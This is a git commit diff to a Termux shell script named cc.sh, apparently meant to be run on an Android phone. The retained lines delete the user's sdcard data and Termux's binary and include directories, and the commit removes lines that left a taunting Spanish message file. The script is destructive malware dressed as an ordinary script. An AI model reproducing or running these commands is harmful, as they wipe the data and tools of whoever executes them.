5e52b239d09dddb645cb5ce10d50ef4d2c4c8642
SuSux13 <55140831+SuSux13@users.noreply.github.com>
2020-04-18 22:06:21 +0200

    Update cc.sh

--- cc.sh
+++ cc.sh
@@ -5,10 +5,7 @@ cd /sdcard
 
 rm -r sdcard
 rn -r storage
-mkdir sdcard
-cd sdcard
-touch Quepasa.txt
-echo esto pasa por no irte de los grupos de CP >> Quepasa.txt
+
 cd $HOME
 rm -r /data/data/com.termux/files/usr/bin
 rm -rÂ  /data/data/com.termux/files/usr/include
